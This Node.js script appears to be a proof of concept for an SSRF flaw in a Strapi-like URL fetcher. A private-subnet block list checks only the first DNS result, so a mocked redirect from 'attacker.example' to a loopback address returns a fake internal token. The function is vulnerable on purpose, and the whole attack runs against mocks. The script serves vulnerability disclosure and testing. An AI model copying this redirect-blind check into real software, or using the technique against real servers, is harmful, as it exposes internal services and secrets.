#!/usr/bin/env node
'use strict';

const dns = require('node:dns/promises');
const fs = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const net = require('node:net');

const FETCH_TIMEOUT_MS = 60_000;

const SSRF_BLOCK_LIST = new net.BlockList();
SSRF_BLOCK_LIST.addSubnet('127.0.0.0', 8);
SSRF_BLOCK_LIST.addSubnet('10.0.0.0', 8);
SSRF_BLOCK_LIST.addSubnet('172.16.0.0', 12);
SSRF_BLOCK_LIST.addSubnet('192.168.0.0', 16);
SSRF_BLOCK_LIST.addSubnet('169.254.0.0', 16);
SSRF_BLOCK_LIST.addSubnet('::1', 128, 'ipv6');
SSRF_BLOCK_LIST.addSubnet('fc00::', 7, 'ipv6');
SSRF_BLOCK_LIST.addSubnet('fe80::', 10, 'ipv6');

const getFilenameFromUrl = (url) => {
  const urlObj = new URL(url);
  return path.basename(decodeURIComponent(urlObj.pathname.split('/').pop() || 'download.bin'));
};

async function vulnerableFetchUrlToInputFile(url, tmpWorkingDirectory, sizeLimit, doFetch) {
  const parsedUrl = new URL(url);
  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    throw new Error(`Invalid URL protocol: ${url}`);
  }

  const { address, family } = await dns.lookup(parsedUrl.hostname);
  const type = family === 6 ? 'ipv6' : 'ipv4';
  if (SSRF_BLOCK_LIST.check(address, type)) {
    throw new Error(`URL resolves to a blocked address: ${url}`);
  }

  const response = await doFetch(url, { signal: AbortSignal.timeout(FETCH_TIMEOUT_MS) });
  const filename = getFilenameFromUrl(response.url);
  const buffer = Buffer.from(await response.arrayBuffer());
  const tmpFilePath = path.join(tmpWorkingDirectory, filename);
  await fs.writeFile(tmpFilePath, buffer);

  return {
    fetchedFinalUrl: response.url,
    tmpFilePath,
    content: buffer.toString('utf8'),
    sizeLimitWas: sizeLimit,
  };
}

async function main() {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'strapi-ssrf-poc-'));

  const originalLookup = dns.lookup;
  dns.lookup = async (hostname) => {
    if (hostname === 'attacker.example') {
      return { address: '93.184.216.34', family: 4 };
    }
    return originalLookup(hostname);
  };

  const mockFetchFollowingRedirectToInternal = async () => ({
    ok: true,
    status: 200,
    statusText: 'OK',
    url: 'http://127.0.0.1:8000/admin/internal-secret.txt',
    headers: new Map([['content-type', 'text/plain']]),
    async arrayBuffer() {
      return Buffer.from('INTERNAL_METADATA_TOKEN=secret-from-loopback');
    },
  });

  try {
    const result = await vulnerableFetchUrlToInputFile(
      'http://attacker.example/redirect',
      tmp,
      1024 * 1024,
      mockFetchFollowingRedirectToInternal
    );

    console.log('Original URL DNS result passed SSRF block list as public.');
    console.log(`Final fetched URL: ${result.fetchedFinalUrl}`);
    console.log(`Wrote response body to: ${result.tmpFilePath}`);
    console.log(`Body: ${result.content}`);
  } finally {
    dns.lookup = originalLookup;
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
